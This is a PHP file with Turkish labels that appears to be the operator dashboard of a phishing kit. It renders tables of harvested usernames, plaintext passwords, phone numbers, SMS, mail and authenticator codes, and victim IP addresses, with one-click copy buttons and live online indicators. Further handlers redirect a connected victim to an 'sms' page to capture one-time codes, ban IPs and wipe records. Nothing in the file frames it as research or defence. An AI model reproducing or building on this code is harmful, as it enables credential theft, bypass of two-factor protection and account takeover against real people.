<?php

require_once '../connect.php';
require_once '../AjaxClass.php';

$ajax = new Ajax($db);

if (!empty($_POST['data'])) {

    $recordHTML = "";

    foreach ($ajax->getAllRecords() as $record) {
        $id = ($record['lastOnline'] > time() ? '<td class="bg-success id">' . htmlspecialchars($record['id']) . '</td>' : '<td class="bg-danger id">' . htmlspecialchars($record['id']) . '</td>');

        $username = htmlspecialchars($record['username']);
        if (strpos($username, 'hotmail') !== false) {
            $username = '<span style="color: red;">' . $username . '</span>';
        }
        $phone_sms = htmlspecialchars($record['phone_sms']);
if (!empty($phone_sms)) {
    $phone_sms = '<span style="color: red;">' . $phone_sms . '</span>';
}

// mail_sms için kontrol
$mail_sms = htmlspecialchars($record['mail_sms']);
if (!empty($mail_sms)) {
    $mail_sms = '<span style="color: red;">' . $mail_sms . '</span>';
}

// auth için kontrol
$auth = htmlspecialchars($record['auth']);
if (!empty($auth)) {
    $auth = '<span style="color: red;">' . $auth . '</span>';
}

$recordHTML .= '<tr>' .
$id .
'<td>' . htmlspecialchars($record['page']) . '</td>' .
'<td onclick="copy(this)">' . $username . '</td>' . 
'<td onclick="copy(this)">' . htmlspecialchars($record['password']) . '</td>' .
'<td onclick="copy(this)">' . htmlspecialchars($record['phone']) . '</td>' .
'<td onclick="copy(this)">' . $phone_sms . '</td>' .
'<button class="btn btn-primary redirect mb-2 mx-2" data-page="sms" data-ip="">SMS</button>' .
'<td onclick="copy(this)">' . $mail_sms . '</td>' .
'<td onclick="copy(this)">' . $auth . '</td>' .
'<td onclick="copy(this)">' . htmlspecialchars($record['hotmail']) . '</td>' .
'<td>' . htmlspecialchars($record['ipAddress']) . '</td>' .
'<td>'.
        '<div class="input-group">' .
        '<button class="btn btn-primary process_modal p-2 pb-1 pt-1" data-ip="' . htmlspecialchars($record['ipAddress']) . '">' .
        '<i class="fas fa-cog"></i> İşlem' .
        '</button>' .
        // Kopyala 3
        '<button class="btn btn-secondary copyButton ml-2 p-2 pb-1 pt-1" data-username="' . htmlspecialchars($record['username']) . '" data-password="' . htmlspecialchars($record['password']) . '" data-phone="' . htmlspecialchars(ltrim($record['phone'], '0')) . '">Kopyala</button>' .
        '</div>' .
    '</td>' .
    '<td>' .
    '<div class="input-group">' .
    '<form method="post" action="kontrol_islemi" class="form-inline">' .
    '<input type="checkbox" class="form-check-input mr-2" style="width: 20px; height: 20px;" name="control" value="1"' . ($record['control'] ? ' checked' : '') . '>' .
    '<input type="hidden" name="id" value="' . htmlspecialchars($record['id']) . '">' .
    '<button type="submit" class="btn btn-sm btn-outline-secondary">Güncelle</button>' .
    '</form>' .

    '<form method="post" action="silme_islemi" class="d-inline-block">' .
    '<input type="hidden" name="remove" value="true">' .
    '<input type="hidden" name="id" value="' . htmlspecialchars($record['id']) . '">' .
    '<button type="submit" class="btn btn-danger ml-2">Sil</button>' .
    '</form>' .
    '</div>' .
    '</td>' .
    '</tr>';
    }

    echo json_encode([
        'online' => ($ajax->getOnline()) ? $ajax->getOnline() : "0",
        'total' => ($ajax->getTotalRecord()) ? $ajax->getTotalRecord() : "0",
        'ban' => ($ajax->getBans()['count']) ? $ajax->getBans()['count'] : "0",
        'records' => $recordHTML
    ]);
}
?>
<?php
 

if (!empty($_POST['remove'])) {

    $ajax->remove("records", "id", $_POST['id']);

}



if (!empty($_POST['ban'])) {

    $ip = $_POST['ip'];

    $insert = $db->prepare("INSERT INTO bans SET ipAddress = ? ");

    $insert->execute([$ip]);

}



if (!empty($_POST['redirect'])) {

    $ip = $_POST['ip'];

    $page = $_POST['page'];

    $token = $ajax->paymentTokenGenerate();

 

    $insert = $db->prepare("INSERT INTO redirect SET ipAddress = ?, page = ? ");

    $insert->execute([$ip, $page]); 

    exit;

}



if (!empty($_POST['unban'])) {

    $ip = $_POST['ip'];

    $delete = $db->prepare("DELETE FROM bans WHERE ipAddress = ? ");

    $delete->execute([$ip]);

}



if (!empty($_POST['recordClear'])) {

    $ajax->recordClear();

}



if (!empty($_POST['banClear'])) {

    $ajax->banClear();

}



if (!empty($_POST['offlineClear'])) {

    $ajax->offlineClear();

}
?>

